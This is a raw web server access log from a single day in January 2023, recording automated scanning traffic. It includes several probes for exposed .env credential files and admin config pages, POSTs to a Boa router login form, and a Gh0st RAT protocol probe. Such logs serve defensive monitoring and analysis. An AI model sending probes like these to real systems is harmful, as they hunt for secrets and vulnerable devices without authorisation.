205.185.118.237 - - [23/Jan/2023:11:09:49 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [23/Jan/2023:11:10:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.99.189.198 - - [23/Jan/2023:11:16:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:11:25:13 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:11:25:13 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.82 - - [23/Jan/2023:11:31:44 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:45:34 -0600] "\x16\x03\x01\x01 \x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:45:38 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:45:45 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:45:54 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:46:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
164.52.25.251 - - [23/Jan/2023:11:46:18 -0600] "\x16\x03\x01\x01 \x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:46:24 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:46:31 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:46:40 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.52.25.251 - - [23/Jan/2023:11:46:44 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
179.43.177.242 - - [23/Jan/2023:11:49:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
185.224.128.219 - - [23/Jan/2023:11:54:49 -0600] "GET /admin/config.php HTTP/1.1" 301 248 "-" "python-requests/2.22.0"
143.110.222.166 - - [23/Jan/2023:12:08:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.190.252.127 - - [23/Jan/2023:12:29:49 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
103.80.155.63 - - [23/Jan/2023:12:40:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:13:06:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [23/Jan/2023:13:21:21 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [23/Jan/2023:14:06:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [23/Jan/2023:14:25:56 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:14:25:58 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [23/Jan/2023:14:30:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
66.240.205.34 - - [23/Jan/2023:14:56:44 -0600] "Gh0st\xad" 400 226 "-" "-"
